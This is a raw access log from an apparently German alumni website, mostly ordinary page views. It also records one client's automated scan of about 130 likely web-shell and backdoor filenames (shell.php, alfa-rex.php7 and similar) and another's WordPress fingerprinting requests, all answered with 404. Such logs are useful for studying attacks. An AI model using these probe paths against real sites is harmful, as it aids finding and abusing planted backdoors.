user;timestamp;referer;target;method;status
b0fc28113fdbcf0183228024aab4f110dd053ea89d7f378ffdb730a1a7c0ad8b;2025-11-09 03:19:39;;/personen/alumni/schule/620014;GET;200
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:22;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:25;;/shoha.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:26;;/past.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:28;;/20ojy.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:29;;/block-bindings.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:30;;/%20colors.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:31;;/layout.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:32;;/end.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:32;;/uploat.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:33;;/uploxe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:34;;/credits.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:35;;/pwnd.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:36;;/Jcrop.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:36;;/go.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:37;;/alfa-rex.php7;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:38;;/pepe.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:39;;/pt.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:40;;/about.php7;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:41;;/abruzi.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:42;;/1wx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:42;;/gool.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:43;;/wp-is.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:44;;/ae.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:45;;/Auth.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:46;;/ropyx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:47;;/14.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:48;;/2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:49;;/Hd.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:50;;/getid3s.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:51;;/Alex-Cross.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:52;;/404.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:53;;/403.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:54;;/chosen.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:55;;/admin-post.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:56;;/pomo.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:57;;/up.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:57;;/wp.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:21:59;;/content.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:00;;/cong.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:01;;/blue.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:01;;/css.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:03;;/js.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:04;;/user.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:05;;/coffee.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:07;;/system.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:07;;/shell.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:09;;/m.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:09;;/sto.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:10;;/db.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:11;;/222.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:12;;/o.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:13;;/an.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:14;;/gmo.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:15;;/file.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:16;;/file5.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:17;;/file17.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:18;;/file32.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:19;;/file3.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:20;;/file6.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:21;;/file15.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:22;;/file9.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:23;;/error.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:24;;/NH19T66T.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:25;;/rei.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:26;;/666.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:27;;/777.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:28;;/888.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:29;;/555.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:30;;/333.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:31;;/zeal.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:32;;/file1.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:33;;/file2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:34;;/filesss.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:35;;/file13.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:36;;/atomlib.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:37;;/manager.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:37;;/abcd.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:38;;/efile.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:39;;/file18.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:40;;/520.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:41;;/031.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:42;;/file7.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:42;;/file4.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:43;;/2%25.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:44;;/1%25.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:45;;/wp-freya.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:46;;/keu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:46;;/file88.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:47;;/0%25.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:48;;/lock360.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:49;;/jmfi2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:50;;/class.1.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:51;;/fs.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:52;;/CLA.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:53;;/gfile.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:54;;/eauu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:55;;/we.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:56;;/fe5.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:56;;/cccc.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:57;;/shell1.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:58;;/gm.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:22:59;;/lala.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:00;;/hexx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:01;;/444.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:02;;/a2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:03;;/cfile.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:03;;/lv.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:04;;/goat.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:05;;/aa.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:06;;/vast.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:07;;/cool.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:08;;/yanki.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:09;;/bolt.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:10;;/nfile.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:10;;/ilex.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:11;;/des.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:13;;/ext.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:14;;/axx.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:15;;/wp-update.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:16;;/yasnu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:17;;/new4.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:17;;/ava.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:18;;/ioxi2.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:19;;/gfile1.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:20;;/ffile.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:21;;/rsnu.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:22;;/default.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:23;;/dfre.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:24;;/pp.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:24;;/13.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:25;;/usep.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:26;;/3.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:27;;/moon.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:28;;/0x.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:29;;/02.php;GET;404
14cab620e3a04e26d9a8d08d667f7feab100430605faa0f81097cf82dbc43fd0;2025-11-09 03:23:30;;/xv.php;GET;404
470d89f6d9b4a37b76161a7b312bc0c2ccbe8c22379f6a21d8fe94fc64423a24;2025-11-09 03:23:50;;/;GET;200
99e6de37f484dbee10b618c5024d0ee20c4ee1d19f35bd17d573ede7e3b0f540;2025-11-09 03:28:32;;/personen/alumni/schule/9004;GET;200
1c0fababa81110b8ad5f3482a7b45716d5f6b94c607269ef085240b653d38aca;2025-11-09 03:37:52;;/personen/alumni/schule/9001;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 03:44:09;/gruppen/hobby/philosophie;/gruppen/hobby/ernahrungswissenschaft;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-09 03:44:10;/gruppen/hobby/philosophie;/gruppen;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:45:59;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:00;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:02;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:04;;/aktuelles/stellenangebote;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:05;;/personen;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:07;;/themen/details/abschied-aus-moabit;GET;200
85a69078e2b47f92cd1daace1e35c86ba620b9d3c209504ee9b535f58a41dc8e;2025-11-09 03:46:08;;/themen/details/der-start-ins-studium;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:17;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:18;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:20;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:21;;/aktuelles/stellenangebote;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:23;;/personen;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:24;;/themen/details/abschied-aus-moabit;GET;200
e6b24d54700cd7b67ecda147481f0c339921136ddfaec6c324aa6e1fd50964eb;2025-11-09 03:46:26;;/themen/details/der-start-ins-studium;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-09 03:50:19;;/personen/alumni/schule/620014;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:18;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:22;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:24;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:26;;/aktuelles/stellenangebote;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:29;;/personen;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:33;;/themen/details/abschied-aus-moabit;GET;200
8ced861ddca46bf9ff8e818ea99e32d0cc590904bf89c63406bb3cb8048c785f;2025-11-09 03:51:36;;/themen/details/der-start-ins-studium;GET;200
7eaa3995b36c1850d6d0ac2652a517b587718b3553fc415e8adbcb216ce3e388;2025-11-09 03:51:39;;/themen/details/was-kommt-nach-dem-abitur;GET;200
54935573732ecadcfb78aefa3aa637afcbd63dcf3229b94a79d13768e86b0b7a;2025-11-09 03:55:39;/themen/details/david-gegen-goliath;/themen/details/david-gegen-goliath;GET;200
48f59d3a2108d48f5334924d18b5b96191378c3bf1e34c9cacaa650633ebfe80;2025-11-09 04:00:32;;/.well-known/security.txt;GET;404
3393adc78f026529b7ab0dd218cc1fefea8e827c1e65a9302d9ad2a9435c454d;2025-11-09 04:03:06;;/personen/alumni/details/heidi-burghard;GET;200
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:23;;//wp-includes/ID3/license.txt;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:23;;//feed/;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:24;;//xmlrpc.php?rsd;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:24;;//blog/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:24;;//web/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:25;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:25;;//wp/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:25;;//2020/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:25;;//2019/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:25;;//2021/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:26;;//shop/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:26;;//wp1/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:26;;//test/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:26;;//site/wp-includes/wlwmanifest.xml;GET;404
ba657ca5c0923e5f689573ec916b9305239aa30e3e1a65162debe090f592d744;2025-11-09 04:05:27;;//cms/wp-includes/wlwmanifest.xml;GET;404
94d434a6dbce27a612478d7f293dd3cfc5411c6d1dbf44e642490f4e69b8b18b;2025-11-09 04:11:24;;/wp-admin/setup-config.php;GET;404
190cd7855b395928d1e15e76d5a50f6ea332fdf3d031fb0f4e4d2b6b9532fece;2025-11-09 04:13:48;;/about/allgemein;GET;200
3f603d208d3bd8b4d45244a3ae56bd763c466b91ae01ae571479c38b514cd42a;2025-11-09 04:23:49;;/personen/alumni/details/joel-schlunder;GET;200
